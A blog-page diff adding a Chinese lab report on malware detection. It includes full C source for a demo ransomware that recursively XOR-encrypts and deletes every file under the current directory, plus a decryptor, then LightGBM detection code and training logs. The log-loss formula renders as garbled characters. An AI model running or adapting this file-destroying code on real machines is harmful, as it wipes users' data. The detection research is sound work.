@@ -122,7 +122,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -168,6 +168,556 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="moyuan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyuan"s website">
+      <meta itemprop="description" content="prograing or coffee">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Moyuan"s website">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/" class="post-title-link" itemprop="url">实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-13 01:05:14 / 修改时间：01:05:48" itemprop="dateCreated datePublished" datetime="2024-12-13T01:05:14+08:00">2024-12-13</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"><a href="#实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究" class="headerlink" title="实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究"></a>实验报告：基于勒索病毒、机器学习和深度学习的恶意程序检测研究</h3><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><p>随着信息技术的迅猛发展，计算机病毒的种类和数量不断增加，给信息安全带来了严峻挑战。传统的病毒检测方法主要依赖特征码和启发式分析，但在应对新型和变种病毒时效果有限。机器学习和深度学习作为现代人工智能的重要分支，提供了新的解决方案。恶意程序是网络安全的重要威胁，其中勒索病毒尤为严重，通过加密受害者文件索取赎金。本实验分三个部分：</p>
+<ol>
+<li>设计一个简单的勒索病毒Demo，了解恶意程序的基本行为。</li>
+<li>利用机器学习方法检测恶意程序。</li>
+<li>利用深度学习方法检测并分类恶意程序。</li>
+</ol>
+<h4 id="第一部分：勒索病毒Demo设计"><a href="#第一部分：勒索病毒Demo设计" class="headerlink" title="第一部分：勒索病毒Demo设计"></a>第一部分：勒索病毒Demo设计</h4><h5 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h5><p>利用ChatGPT实现一个勒索病毒的简化模型，模拟文件加密与解密流程，探究恶意程序的行为特征。</p>
+<h5 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a><strong>技术实现</strong></h5><ol>
+<li>加密功能：<ul>
+<li>遍历当前目录及子目录中的所有文件。</li>
+<li>使用简单的异或加密算法(<code>XOR</code>)加密文件内容，并将加密后的文件扩展名改为<code>.exe</code>。</li>
+<li>删除原始文件，保留加密后的文件。</li>
+</ul>
+</li>
+<li>解密功能：<ul>
+<li>遍历加密文件，使用相同的<code>XOR</code>解密逻辑还原原始文件。</li>
+<li>删除加密文件，恢复文件原始状态。</li>
+</ul>
+</li>
+</ol>
+<h5 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a><strong>代码逻辑</strong></h5><ul>
+<li>文件遍历：使用Windows API递归遍历文件夹。</li>
+<li>文件操作：基于<code>FILE*</code>文件指针读写文件。</li>
+</ul>
+<h5 id="安全注意事项"><a href="#安全注意事项" class="headerlink" title="安全注意事项"></a><strong>安全注意事项</strong></h5><ul>
+<li><p><strong>仅供学习使用</strong>，禁止用于任何非法目的。</p>
+</li>
+<li><p>所有操作应限制在“测试文件夹”中，避免误操作导致数据丢失。</p>
+</li>
+<li><p><code>encode-main.cpp</code></p>
+</li>
+<li><p>```</p>
+<h1 id="include"><a href="#include" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-1"><a href="#include-1" class="headerlink" title="include"></a>include<windows.h></h1><h1 id="include”funcs-h”"><a href="#include”funcs-h”" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1></li>
+</ul>
+<p>  int main() {<br>      char buff[MAX_PATH];<br>      GetCurrentDirectory(MAX_PATH, buff);<br>      findFile(buff);<br>      printf(“Oh, ho, you got it\n”);<br>      system(“pause”);<br>      return 0;<br>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`encode-funcs.cpp`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="include”funcs-h”-1"><a href="#include”funcs-h”-1" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1><h1 id="include-2"><a href="#include-2" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-3"><a href="#include-3" class="headerlink" title="include"></a>include<windows.h></h1><p>  void findFile(char<em> pathName) {<br>      char currFile[MAX_PATH]; // 暂时存储每个文件名<br>      memset(currFile, 0, MAX_PATH);<br>      sprintf(currFile, “%s\</em>.*”, pathName);<br>      _WIN32_FIND_DATAA findData;<br>      HANDLE hFile = FindFirstFile(currFile, &amp;findData);<br>      if (hFile == INVALID_HANDLE_VALUE)<br>          return;</p>
+<pre><code>  int ret = 0;
+  while (1) &#123;
+      memset(currFile, 0, MAX_PATH);
+      sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);
+      // 检查文件属性--文件还是文件夹？
+      if (findData.cFileName[0] == &#39;.&#39;); //对特殊文件夹不进行处理
+      else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数
+          findFile(currFile);
+      else //否则，处理当前文件
+          enCode(currFile);
+
+      ret = FindNextFile(hFile, &amp;findData);
+      if (!ret)
+          break;
+  &#125;
+</code></pre><p>  }</p>
+<p>  void enCode(char<em> pathFile) {<br>      //打开待加密文件，创建加密后文件<br>      FILE</em> fpSrc = fopen(pathFile, “rb”); //只读字节流<br>      char buff[MAX_PATH];<br>      sprintf(buff, “%s.exe”, pathFile);<br>      FILE* fpDst = fopen(buff, “wb”); //只写字节流</p>
+<pre><code>  if (fpSrc == NULL || fpDst == NULL)
+      return;
+  //以单个字节循环读取待加密文件内容，并写入加密文件中
+  char currByte;
+  while (1) &#123;
+      int count = fread(&amp;currByte, 1, 1, fpSrc);
+      if (count &lt; 1) //没读到
+          break;
+      currByte ^= 0x66; //简单异或加密法
+      fwrite(&amp;currByte, 1, 1, fpDst); //写入加密文件
+  &#125;
+  fclose(fpSrc);
+  fclose(fpDst);
+  remove(pathFile); //删除原文件
+</code></pre><p>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`encode-funcs.h`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="pragma-once"><a href="#pragma-once" class="headerlink" title="pragma once"></a>pragma once</h1><h1 id="pragma-warning-disable-4996"><a href="#pragma-warning-disable-4996" class="headerlink" title="pragma warning(disable : 4996)"></a>pragma warning(disable : 4996)</h1><p>  // 在指定路径下递归寻找所有文件<br>  void findFile(char* pathName);</p>
+<p>  // 加密操作<br>  void enCode(char* pathFile);<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`decode-main.cpp`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="include-4"><a href="#include-4" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-5"><a href="#include-5" class="headerlink" title="include"></a>include<windows.h></h1><h1 id="include”funcs-h”-2"><a href="#include”funcs-h”-2" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1><p>  int main() {<br>      char buff[MAX_PATH];<br>      GetCurrentDirectory(MAX_PATH, buff);<br>      findFile(buff);<br>      printf(“Oh, ho, all file recovered！\n”);<br>      system(“pause”);<br>      return 0;<br>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`decode-funcs.cpp`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="include”funcs-h”-3"><a href="#include”funcs-h”-3" class="headerlink" title="include”funcs.h”"></a>include”funcs.h”</h1><h1 id="include-6"><a href="#include-6" class="headerlink" title="include"></a>include<stdio.h></h1><h1 id="include-7"><a href="#include-7" class="headerlink" title="include"></a>include<windows.h></h1><p>  void findFile(char<em> pathName) {<br>      char currFile[MAX_PATH]; // 暂时存储每个文件名<br>      memset(currFile, 0, MAX_PATH);<br>      sprintf(currFile, “%s\</em>.*”, pathName);<br>      _WIN32_FIND_DATAA findData;<br>      HANDLE hFile = FindFirstFile(currFile, &amp;findData);<br>      if (hFile == INVALID_HANDLE_VALUE)<br>          return;</p>
+<pre><code>  int ret = 0;
+  while (1) &#123;
+      memset(currFile, 0, MAX_PATH);
+      sprintf(currFile, &quot;%s\\%s&quot;, pathName, findData.cFileName);
+      // 检查文件属性--文件还是文件夹？
+      if (findData.cFileName[0] == &#39;.&#39;); //对特殊文件夹不进行处理
+      else if ((findData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY))  //如果是普通文件夹，递归调用findFile函数
+          findFile(currFile);
+      else //否则，处理当前文件(安全起见这里仅打印文件名)
+          deCode(currFile);
+
+      ret = FindNextFile(hFile, &amp;findData);
+      if (!ret)
+          break;
+  &#125;
+</code></pre><p>  }</p>
+<p>  void deCode(char<em> pathFile) {<br>      //打开待解密文件，创建解密后文件<br>      FILE</em> fpSrc = fopen(pathFile, “rb”); //只读字节流<br>      char buff[MAX_PATH];<br>      memset(buff, 0, MAX_PATH);<br>      //去掉.exe后缀<br>      if (dropEXE(pathFile, buff) != 0) //如果返回非0，则说明当前文件非.exe结尾，不进行解密处理<br>          return;<br>      FILE* fpDst = fopen(buff, “wb”); //只写字节流<br>      if (fpSrc == NULL || fpDst == NULL)<br>          return;<br>      //以单个字节循环读取待解密文件内容，并写入解密文件中<br>      char currByte;<br>      while (1) {<br>          int count = fread(&amp;currByte, 1, 1, fpSrc);<br>          if (count &lt; 1) //没读到<br>              break;<br>          currByte ^= 0x66; //简单异或解密法<br>          fwrite(&amp;currByte, 1, 1, fpDst); //写入解密文件<br>      }<br>      fclose(fpSrc);<br>      fclose(fpDst);<br>      printf(“Congrat! %s recoveried successfully!\n”, buff);<br>      remove(pathFile);<br>  }</p>
+<p>  int dropEXE(char<em> fpSrc, char</em> fpDst) {<br>      int n = strlen(fpSrc);<br>      if (n &lt; 4)<br>          return 1;<br>      char check[5];<br>      for (int i = 0; i &lt; 4; ++i)<br>          check[i] = *(fpSrc + n - 4 + i);<br>      check[4] = ‘\0’;<br>      if (strcmp(check, “.exe”) != 0) {<br>          printf(“sorry, %s is not a .exe file, recovery failed!\n”, fpSrc);<br>          return 1;<br>      }<br>      strncpy(fpDst, fpSrc, n - 4);<br>      return 0;<br>  }<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`decode-funcs.h`</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<h1 id="pragma-once-1"><a href="#pragma-once-1" class="headerlink" title="pragma once"></a>pragma once</h1><h1 id="pragma-warning-disable-4996-1"><a href="#pragma-warning-disable-4996-1" class="headerlink" title="pragma warning(disable : 4996)"></a>pragma warning(disable : 4996)</h1><p>  // 在指定路径下递归寻找所有文件<br>  void findFile(char* pathName);</p>
+<p>  // 解密操作<br>  void deCode(char<em> pathFile);<br>  int dropEXE(char</em> fpSrc, char* fpDst);<br>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &#123;% asset_img image-20241213000517248.png image-20241213000517248 %&#125;</span><br><span class="line"></span><br><span class="line">  &#123;% asset_img image-20241213000536557.png image-20241213000536557 %&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  &#123;% asset_img image-20241213000633707.png image-20241213000633707 %&#125;</span><br><span class="line"></span><br><span class="line">#### 第二部分：基于机器学习的恶意程序检测</span><br><span class="line"></span><br><span class="line">恶意软件是一种被设计用来对目标计算机造成破坏或占用目标计算机资源的软件，包括蠕虫、木马、勒索病毒等。近年来，随着虚拟货币的流行，挖矿类恶意程序也大规模出现，严重侵害用户利益。通过结合机器学习和深度学习技术，能够有效提高恶意程序的检测率和泛化能力。</span><br><span class="line"></span><br><span class="line">本实验以[阿里云安全恶意程序检测竞赛](https://tianchi.aliyun.com/competition/entrance/231694/information)提供的恶意程序检测数据集为基础，探索恶意程序检测的多种方法，包括：</span><br><span class="line"></span><br><span class="line">1. 模拟勒索病毒行为。</span><br><span class="line">2. 基于机器学习的恶意程序检测。</span><br><span class="line">3. 基于深度学习的恶意程序分类。</span><br><span class="line"></span><br><span class="line">##### 数据集介绍：</span><br><span class="line"></span><br><span class="line">阿里云安全恶意程序检测数据集 ([阿里云数据集](https://tianchi.aliyun.com/dataset/137262))</span><br><span class="line"></span><br><span class="line">本次实验使用的数据集由阿里云提供，包含从沙箱模拟运行后的Windows可执行程序API调用序列。数据总计约6亿条，包括多种恶意程序类型和正常文件的数据。数据集主要特点和内容如下：</span><br><span class="line"></span><br><span class="line">###### **1. 数据结构**</span><br><span class="line"></span><br><span class="line">| 字段名称       | 数据类型 | 解释                                                         |</span><br><span class="line">| -------------- | -------- | :----------------------------------------------------------- |</span><br><span class="line">| `file_id`      | `bigint` | 文件编号                                                     |</span><br><span class="line">| `label`        | `bigint` | 文件标签：0（正常）、1（勒索病毒）、2（挖矿程序）、3（DDoS木马）、4（蠕虫病毒）、5（感染型病毒）、6（后门程序）、7（木马程序） |</span><br><span class="line">| `api`          | `string` | 文件调用的API名称                                            |</span><br><span class="line">| `tid`          | `bigint` | 调用API的线程编号                                            |</span><br><span class="line">| `return_value` | `string` | API返回值                                                    |</span><br><span class="line">| `index`        | `string` | API调用的顺序编号，在同线程中保证顺序，但不同线程之间无顺序关系 |</span><br><span class="line"></span><br><span class="line">###### **2. 数据规模**</span><br><span class="line"></span><br><span class="line">- 训练数据：约9000万次调用，文件1万多个（以文件编号汇总）。</span><br><span class="line">- 测试数据：约8000万次调用，包含约1万个文件。</span><br><span class="line">- 每个文件中的API调用可能超过5000条，超出部分已截断。</span><br><span class="line"></span><br><span class="line">###### **3. 数据预处理**</span><br><span class="line"></span><br><span class="line">- 数据均已脱敏，确保隐私和安全。</span><br><span class="line">- 每条记录包含完整的调用上下文及线程信息，有助于模型捕获程序行为特征。</span><br><span class="line"></span><br><span class="line">###### **4. 评测指标**</span><br><span class="line"></span><br><span class="line">使用LogLoss（对数损失）作为评测指标：</span><br><span class="line"></span><br><span class="line">logloss=−1�∑�=1�∑�=1�[���log⁡(���)+(1−���)log⁡(1−���)]</span><br><span class="line"></span><br><span class="line">其中：</span><br><span class="line"></span><br><span class="line">- **�**：表示分类数（总共6个类别）。</span><br><span class="line">- **�**：表示测试集样本总数。</span><br><span class="line">- **���**：第�个样本是否属于第�类（是-1，否-0）。</span><br><span class="line">- **���**：第�个样本被预测为第�类的概率（如：prob0, prob1, prob2, prob3, prob4, prob5 ,prob6,prob7）。</span><br><span class="line"></span><br><span class="line">##### **实验方法**</span><br><span class="line"></span><br><span class="line">1. 特征提取：</span><br><span class="line">   - 将恶意软件的数据格式化，主要包括API调用序列、线程信息等。</span><br><span class="line">   - 统一数据的API字段编码，使用LabelEncoder为API字段生成整数值，便于模型处理。</span><br><span class="line">   - 对API调用序列长度进行填充/截断（最大长度设为5000）。</span><br><span class="line">   - 基于TF-IDF对API调用文本进行特征提取。</span><br><span class="line">2. 模型训练：</span><br><span class="line">   - 使用TF-IDF提取特征，结合LightGBM分类模型。</span><br><span class="line">   - TF-IDF使用一元和二元词组，特征数量限制为1000。</span><br><span class="line">   - 使用5折交叉验证评估模型性能。</span><br><span class="line"></span><br><span class="line">##### **实验结果**</span><br><span class="line"></span><br><span class="line">1. 代码实现：</span><br><span class="line">   - 特征提取：基于TF-IDF的API序列向量化。</span><br><span class="line">   - 模型训练：使用LightGBM进行多分类任务。</span><br><span class="line">2. 性能表现：</span><br><span class="line">   - 平均验证集准确率：**90.24%**。</span><br><span class="line">   - 每折交叉验证的准确率分布：</span><br><span class="line">     - 折1：90.82%</span><br><span class="line">     - 折2：89.67%</span><br><span class="line">     - 折3：90.49%</span><br><span class="line">     - 折4：89.41%</span><br><span class="line">     - 折5：90.78%</span><br><span class="line">3. 特征贡献：</span><br><span class="line">   - TF-IDF特征对模型贡献显著，尤其是高频API组合。线程相关统计特征如调用次数、API分布等也显著提升了分类效果。</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>PS D:\chen_hao\病毒检测机器学习&gt; &amp; D:/ProgramSoftware/anaconda3/python.exe d:/chen_hao/病毒检测机器学习/TF-IDF_LightGBM.py<br>检查GPU状态…<br>GPU 检查失败，将使用 CPU 模式: module ‘lightgbm’ has no attribute ‘get_gpu_device_count’<br>读取训练数据…<br>读取测试数据…<br>训练数据形状: (89806693, 5)<br>测试数据形状: (79288375, 4)<br>准备训练数据…<br>编码标签…<br>原始标签分布:<br>label<br>5    33033543<br>0    16375107<br>7    15081535<br>2     9693969<br>3     8117585<br>6     4586578<br>1     2254561<br>4      663815<br>Name: count, dtype: int64<br>标签映射:<br>{0: 0, 1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7}<br>提取基础统计特征…<br>计算基础聚合特征…<br>计算API序列特征…<br>计算线程特征…<br>提取TF-IDF特征…<br>准备API序列…<br>训练TF-IDF向量化器…<br>开始5折交叉验证训练…</p>
+<p>训练折数 1/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.267747<br>Early stopping, best iteration is:<br>[103]   valid_0’s multi_logloss: 0.267092<br>Fold 1 验证集准确率: 0.9082</p>
+<p>训练折数 2/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.315787<br>Early stopping, best iteration is:<br>[93]    valid_0’s multi_logloss: 0.314403<br>Fold 2 验证集准确率: 0.8967</p>
+<p>训练折数 3/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.299846<br>Early stopping, best iteration is:<br>[88]    valid_0’s multi_logloss: 0.298147<br>Fold 3 验证集准确率: 0.9049</p>
+<p>训练折数 4/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.331149<br>Early stopping, best iteration is:<br>[83]    valid_0’s multi_logloss: 0.328906<br>Fold 4 验证集准确率: 0.8941</p>
+<p>训练折数 5/5<br>Training until validation scores don’t improve for 50 rounds<br>[100]   valid_0’s multi_logloss: 0.292818<br>Early stopping, best iteration is:<br>[95]    valid_0’s multi_logloss: 0.291777<br>Fold 5 验证集准确率: 0.9078</p>
+<p>平均验证集准确率: 0.9024<br>生成预测结果…<br>准备测试数据…<br>编码标签…<br>提取基础统计特征…<br>计算基础聚合特征…<br>计算API序列特征…<br>计算线程特征…<br>提取TF-IDF特征…<br>准备API序列…<br>生成预测…<br>保存预测结果…<br>完成!<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212110923814.png image-20241212110923814 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% asset_img image-20241212110951238.png image-20241212110951238 %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>import numpy as np<br>import pandas as pd<br>from sklearn.metrics import accuracy_score<br>from sklearn.feature_extraction.text import TfidfVectorizer<br>from sklearn.model_selection import train_test_split, StratifiedKFold<br>import lightgbm as lgb<br>import warnings</p>
+<p>warnings.filterwarnings(‘ignore’)</p>
+<p>def check<em>gpu():<br>    “””检查GPU是否可用”””<br>    try:<br>        lgb<em>version = lgb.__version</em></em><br>        is_gpu_available = lgb.get_gpu_device_count() &gt; 0<br>        print(f”LightGBM 版本: {lgb_version}”)<br>        print(f”GPU 可用: {is_gpu_available}”)<br>        if is_gpu_available:<br>            print(f”可用 GPU 数量: {lgb.get_gpu_device_count()}”)<br>    except Exception as e:<br>        print(f”GPU 检查失败，将使用 CPU 模式: {e}”)<br>        return False<br>    return is_gpu_available</p>
+<p>def optimize_dtypes(df):<br>    “””优化数据类型以减少内存使用”””<br>    for col in df.columns:<br>        if df[col].dtype == ‘float64’:<br>            df[col] = df[col].astype(‘float32’)<br>        elif df[col].dtype == ‘int64’:<br>            df[col] = df[col].astype(‘int32’)<br>    return df</p>
+<p>class MalwareClassifier:<br>    def <strong>init</strong>(self, use_gpu=True):<br>        self.tfidf = None<br>        self.models = None<br>        self.feature_importances = None<br>        self.use_gpu = use_gpu<br>        self.label_map = None</p>
+<pre><code>def _encode_labels(self, train_data=None, test_data=None):
+    &quot;&quot;&quot;标签编码&quot;&quot;&quot;
+    if train_data is not None and &#39;label&#39; in train_data.columns:
+        print(&quot;原始标签分布:&quot;)
+        print(train_data[&#39;label&#39;].value_counts())
+        unique_labels = sorted(train_data[&#39;label&#39;].unique())
+        self.label_map = &#123;label: idx for idx, label in enumerate(unique_labels)&#125;
+        print(&quot;标签映射:&quot;)
+        print(self.label_map)
+        train_data[&#39;label&#39;] = train_data[&#39;label&#39;].map(self.label_map)
+
+    if test_data is not None and &#39;label&#39; in test_data.columns:
+        test_data[&#39;label&#39;] = test_data[&#39;label&#39;].map(self.label_map)
+
+    return train_data, test_data
+
+def prepare_features(self, train_data=None, test_data=None):
+    &quot;&quot;&quot;准备所有特征&quot;&quot;&quot;
+    print(&quot;编码标签...&quot;)
+    train_data, test_data = self._encode_labels(train_data, test_data)
+
+    if train_data is not None:
+        print(&quot;提取基础统计特征...&quot;)
+        train_stats = self._extract_basic_stats(train_data)
+        print(&quot;提取TF-IDF特征...&quot;)
+        if test_data is not None:
+            train_tfidf, test_tfidf = self._extract_tfidf_features(train_data, test_data)
+            test_stats = self._extract_basic_stats(test_data)
+            train_features = pd.merge(train_stats, train_tfidf, on=&#39;file_id&#39;)
+            test_features = pd.merge(test_stats, test_tfidf, on=&#39;file_id&#39;)
+            return train_features, test_features
+        else:
+            train_tfidf = self._extract_tfidf_features(train_data)
+            return pd.merge(train_stats, train_tfidf, on=&#39;file_id&#39;)
+    elif test_data is not None:
+        print(&quot;提取基础统计特征...&quot;)
+        test_stats = self._extract_basic_stats(test_data)
+        print(&quot;提取TF-IDF特征...&quot;)
+        test_tfidf = self._extract_tfidf_features(test_data)
+        return pd.merge(test_stats, test_tfidf, on=&#39;file_id&#39;)
+
+def _extract_basic_stats(self, data):
+    &quot;&quot;&quot;提取基础统计特征&quot;&quot;&quot;
+    if &#39;label&#39; in data.columns:
+        df = data.groupby(&#39;file_id&#39;)[&#39;label&#39;].first().reset_index()
+    else:
+        df = pd.DataFrame(&#123;&#39;file_id&#39;: data[&#39;file_id&#39;].unique()&#125;)
+
+    print(&quot;计算基础聚合特征...&quot;)
+    agg_features = data.groupby(&#39;file_id&#39;).agg(&#123;
+        &#39;api&#39;: [&#39;count&#39;, &#39;nunique&#39;],
+        &#39;tid&#39;: &#39;nunique&#39;,
+        &#39;index&#39;: [&#39;min&#39;, &#39;max&#39;, &#39;mean&#39;, &#39;std&#39;]
+    &#125;).reset_index()
+    agg_features.columns = [&#39;file_id&#39;, &#39;api_calls&#39;, &#39;unique_apis&#39;,
+                            &#39;thread_count&#39;, &#39;min_index&#39;, &#39;max_index&#39;,
+                            &#39;mean_index&#39;, &#39;std_index&#39;]
+
+    df = pd.merge(df, agg_features, on=&#39;file_id&#39;, how=&#39;left&#39;)
+
+    print(&quot;计算API序列特征...&quot;)
+    api_counts = data.groupby([&#39;file_id&#39;, &#39;api&#39;]).size().reset_index(name=&#39;api_freq&#39;)
+    top_apis = api_counts.groupby(&#39;file_id&#39;)[&#39;api_freq&#39;].agg([&#39;max&#39;, &#39;mean&#39;]).reset_index()
+    top_apis.columns = [&#39;file_id&#39;, &#39;max_api_freq&#39;, &#39;mean_api_freq&#39;]
+
+    df = pd.merge(df, top_apis, on=&#39;file_id&#39;, how=&#39;left&#39;)
+
+    print(&quot;计算线程特征...&quot;)
+    thread_stats = data.groupby([&#39;file_id&#39;, &#39;tid&#39;]).size().reset_index(name=&#39;apis_per_thread&#39;)
+    thread_agg = thread_stats.groupby(&#39;file_id&#39;)[&#39;apis_per_thread&#39;].agg([&#39;mean&#39;, &#39;std&#39;, &#39;max&#39;]).reset_index()
+    thread_agg.columns = [&#39;file_id&#39;, &#39;mean_apis_per_thread&#39;, &#39;std_apis_per_thread&#39;, &#39;max_apis_per_thread&#39;]
+
+    df = pd.merge(df, thread_agg, on=&#39;file_id&#39;, how=&#39;left&#39;)
+
+    df[&#39;unique_api_ratio&#39;] = df[&#39;unique_apis&#39;] / (df[&#39;api_calls&#39;] + 1)
+    df[&#39;api_per_thread_ratio&#39;] = df[&#39;api_calls&#39;] / (df[&#39;thread_count&#39;] + 1)
+
+    df = df.fillna(0)
+    return df
+
+def _extract_tfidf_features(self, train_data, test_data=None):
+    def prepare_api_sequence(data):
+        return data.groupby(&#39;file_id&#39;).agg(&#123;
+            &#39;api&#39;: lambda x: &#39; &#39;.join(x.astype(str))
+        &#125;).reset_index().rename(columns=&#123;&#39;api&#39;: &#39;api_sequence&#39;&#125;)
+
+    print(&quot;准备API序列...&quot;)
+    train_sequences = prepare_api_sequence(train_data)
+
+    if self.tfidf is None:
+        print(&quot;训练TF-IDF向量化器...&quot;)
+        self.tfidf = TfidfVectorizer(
+            max_features=1000,
+            ngram_range=(1, 2),
+            min_df=5,
+            dtype=np.float32,
+            token_pattern=r&#39;(?u)\b\w+\b&#39;
+        )
